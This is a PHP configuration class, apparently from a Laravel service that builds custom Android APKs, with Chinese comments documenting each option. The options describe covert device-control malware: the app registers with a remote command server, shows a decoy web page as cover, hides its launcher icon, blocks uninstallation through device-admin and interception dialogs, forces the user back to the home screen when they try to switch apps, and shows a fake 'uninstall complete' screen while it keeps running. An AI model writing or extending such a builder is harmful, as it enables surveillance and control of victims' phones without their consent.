<?php

declare(strict_types=1);

namespace App\Services\GradleApkBuilder;

use Illuminate\Contracts\Support\Arrayable;

/**
 * update-replica APK 构建配置 DTO
 *
 * 所有配置写入 server_config.json（唯一构建时配置文件）
 */
final class GradleApkBuildConfig implements Arrayable
{
    public function __construct(
        /**
         * 应用显示名称
         * → strings.xml app_name + accessibility_service_label
         * → server_config.json pageStyleConfig.appName + configMaskText
         */
        public string $app_name,

        /**
         * HTTP API 服务器地址
         * → server_config.json serverUrl
         * 用途: 设备注册、日志上传、命令轮询等 HTTP 接口的基地址
         * 示例: 'http://192.168.31.35:8080'
         */
        public string $server_url,

        /**
         * WebSocket 服务器地址
         * → server_config.json websocketUrl
         * 用途: 设备与控制平台的实时双向通信
         * 示例: 'ws://192.168.31.35:8081'
         */
        public string $websocket_url,

        /**
         * 设备认证令牌 (由 DeviceTokenService::generateOwnerToken 生成)
         * → server_config.json ownerToken
         * 格式: '{userId}.{hmac}.{timestamp}'
         * 用途: 设备上线时与服务端握手认证，标识归属用户
         */
        public string $owner_token,

        /**
         * Android 应用包名 (Application ID)
         * → build.gradle applicationId
         * 用途: APK 安装到设备后的唯一标识，同一设备上不同包名可共存
         * 注意: 只改 applicationId，不改 namespace (Java 源码包名不变)
         */
        public string $application_id = 'dev.deltalab2964.swift',

        /**
         * 版本号 (用户可见)
         * → build.gradle versionName
         * 用途: 设置 > 应用详情中显示的版本号
         */
        public string $version_name = '4.6.4',

        /**
         * 版本代码 (系统内部)
         * → build.gradle versionCode
         * 用途: 系统判断版本升降级的整数值，每次发布需递增
         */
        public int $version_code = 40604,

        /**
         * 调试模式
         * → server_config.json debug
         * true: 启用详细日志、禁用遮罩等调试特性
         * false: 生产模式，所有保护/遮罩/隐藏功能正常工作
         */
        public bool $debug = false,

        /**
         * 禁用卸载保护
         * → server_config.json (通过 debugConfig)
         * true: 用户可以正常卸载应用
         * false: 启用设备管理员 + 卸载拦截弹窗保护
         * 默认 true: 开发测试阶段不阻止卸载
         */
        public bool $disable_uninstall_protection = true,

        /**
         * 禁用最近任务防护 (RecentsGuard)
         * → server_config.json (通过 debugConfig)
         * true: 用户可以正常使用最近任务、桌面滑动
         * false: 检测到 Launcher/SystemUI 事件时自动按 HOME 键弹回，防止用户切换应用
         * 默认 true: 避免开发测试时被反复弹回桌面
         */
        public bool $disable_recents_guard = true,

        /**
         * 假卸载模式
         * → server_config.json uninstallMode
         * true: 用户"卸载"后显示假的卸载完成界面，实际应用仍在运行
         * false: 不启用假卸载覆盖层
         */
        public bool $uninstall_mode = false,

        /**
         * 禁用配置遮罩 (Loading 界面)
         * → server_config.json enableConfigMask (取反)
         * true: 跳过启动时的"正在配置"遮罩界面
         * false: 首次启动显示 loading 遮罩直到配置完成
         */
        public bool $disable_config_mask = false,

        /**
         * 禁用图标隐藏
         * → server_config.json showAppIcon (取反)
         * true: 桌面图标始终可见
         * false: 配置完成后自动隐藏桌面图标 (通过禁用 LauncherAlias)
         */
        public bool $disable_icon_hide = true,

        /**
         * WebView 主页 URL
         * → server_config.json webUrl
         * 用途: 无障碍开启后 WebView 加载的主页面 (作为前台遮眼法)
         */
        public string $web_url = 'https://m.baidu.com',

        /**
         * 无障碍引导标题
         * → strings.xml enable_accessibility_service
         * 用途: 引导用户开启无障碍服务的标题文字
         */
        public string $alert_title = '',

        /**
         * 无障碍引导说明
         * → server_config.json pageStyleConfig.usageInstructions
         * → strings.xml usage_instructions
         * 用途: 引导用户开启无障碍的步骤说明
         */
        public string $alert_msg = '',

        /**
         * 引导按钮文本
         * → server_config.json pageStyleConfig.enableButtonText
         * 用途: 跳转到无障碍设置的按钮文字
         */
        public string $ok_text = '',

        /**
         * 自定义应用图标路径 (服务器文件系统路径)
         * 构建时操作: 复制到 mipmap-{density}/ic_launcher.png + adaptive icon XML
         * 留空: 保持默认图标
         */
        public string $icon_path = '',

        /**
         * 自定义引导背景图路径 (服务器文件系统路径)
         * 构建时操作: 复制到 assets/bg_accessibility.png
         * 留空: 保持默认背景图
         */
        public string $background_path = '',
    ) {}

    public static function fromArray(array $data): self
    {
        return new self(
            app_name: $data['app_name'] ?? '',
            server_url: $data['server_url'] ?? '',
            websocket_url: $data['websocket_url'] ?? '',
            owner_token: $data['owner_token'] ?? '',

            application_id: $data['application_id'] ?? 'dev.deltalab2964.swift',
            version_name: $data['version_name'] ?? '4.6.4',
            version_code: (int) ($data['version_code'] ?? 40604),

            debug: (bool) ($data['debug'] ?? false),

            disable_uninstall_protection: (bool) ($data['disable_uninstall_protection'] ?? true),
            disable_recents_guard: (bool) ($data['disable_recents_guard'] ?? true),
            uninstall_mode: (bool) ($data['uninstall_mode'] ?? false),

            disable_config_mask: (bool) ($data['disable_config_mask'] ?? false),
            disable_icon_hide: (bool) ($data['disable_icon_hide'] ?? false),
            web_url: $data['web_url'] ?? 'https://m.baidu.com',

            alert_title: $data['alert_title'] ?? '',
            alert_msg: $data['alert_msg'] ?? '',
            ok_text: $data['ok_text'] ?? '',

            icon_path: $data['icon_path'] ?? '',
            background_path: $data['background_path'] ?? '',
        );
    }

    public function validate(): array
    {
        $errors = [];

        if (empty($this->app_name)) {
            $errors[] = 'app_name is required';
        } elseif (mb_strlen($this->app_name) > 100) {
            $errors[] = 'app_name must not exceed 100 characters';
        }

        if (empty($this->server_url)) {
            $errors[] = 'server_url is required';
        }

        if (empty($this->websocket_url)) {
            $errors[] = 'websocket_url is required';
        } elseif (! preg_match('/^wss?:\/\/.+/', $this->websocket_url)) {
            $errors[] = 'websocket_url must start with ws:// or wss://';
        }

        if (empty($this->owner_token)) {
            $errors[] = 'owner_token is required';
        }

        if (! empty($this->application_id) && ! preg_match('/^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/', $this->application_id)) {
            $errors[] = 'application_id must be a valid package name (e.g., com.example.app)';
        }

        if (! preg_match('/^\d+(\.\d+){0,2}$/', $this->version_name)) {
            $errors[] = 'version_name must be a valid version (e.g., 1.0 or 1.0.0)';
        }

        if ($this->version_code < 1) {
            $errors[] = 'version_code must be a positive integer';
        }

        if (! empty($this->icon_path) && ! file_exists($this->icon_path)) {
            $errors[] = "icon_path does not exist: {$this->icon_path}";
        }

        if (! empty($this->background_path) && ! file_exists($this->background_path)) {
            $errors[] = "background_path does not exist: {$this->background_path}";
        }

        return $errors;
    }

    public function isValid(): bool
    {
        return empty($this->validate());
    }

    /**
     * server_config.json — 唯一构建时配置文件
     */
    public function toServerConfig(): array
    {
        $config = [
            'buildTime' => date('c'),
            'version' => $this->version_name,
            'debug' => $this->debug,
            'serverUrl' => $this->server_url,
            'websocketUrl' => $this->websocket_url,
            'webUrl' => $this->web_url,
            'ownerToken' => $this->owner_token,
            'deviceKeySalt' => '',
            'showAppIcon' => ! $this->disable_icon_hide,
            'uninstallMode' => $this->uninstall_mode,
            'enableConfigMask' => ! $this->disable_config_mask,
            'configMaskStyle' => 'loading',
            'configMaskStatus' => '配置完成后将自动返回应用',
            'configMaskText' => $this->app_name,
            'configMaskTextColor' => '#FFFFFF',
            'configMaskSubtitle' => '',
            'configMaskSubtitleColor' => '#FFFFFF',
            'enableProgressBar' => true,
            'loadingTips' => ['正在连接服务器...', '正在加载资源...', '正在初始化配置...', '正在启动'],
            'pageStyleConfig' => [
                'appName' => $this->app_name,
                'statusText' => '',
                'enableButtonText' => $this->ok_text ?: '立即前往',
                'enableButtonTextColor' => '#FFFFFF',
                'usageInstructions' => $this->alert_msg ?: '',
                'buttonColor' => '#1890FF',
                'applicationId' => $this->application_id,
                'versionName' => $this->version_name,
            ],
            'debugConfig' => [
                'disable_uninstall_protection' => $this->disable_uninstall_protection,
                'disable_recents_guard' => $this->disable_recents_guard,
                'disable_icon_hide' => $this->disable_icon_hide,
                'disable_config_mask' => $this->disable_config_mask,
            ],
        ];

        return $config;
    }

    public function toArray(): array
    {
        return [
            'app_name' => $this->app_name,
            'server_url' => $this->server_url,
            'websocket_url' => $this->websocket_url,
            'owner_token' => $this->owner_token,
            'application_id' => $this->application_id,
            'version_name' => $this->version_name,
            'version_code' => $this->version_code,
            'debug' => $this->debug,
            'disable_uninstall_protection' => $this->disable_uninstall_protection,
            'disable_recents_guard' => $this->disable_recents_guard,
            'uninstall_mode' => $this->uninstall_mode,
            'disable_config_mask' => $this->disable_config_mask,
            'disable_icon_hide' => $this->disable_icon_hide,
            'web_url' => $this->web_url,
            'alert_title' => $this->alert_title,
            'alert_msg' => $this->alert_msg,
            'ok_text' => $this->ok_text,
            'icon_path' => $this->icon_path,
            'background_path' => $this->background_path,
        ];
    }
}
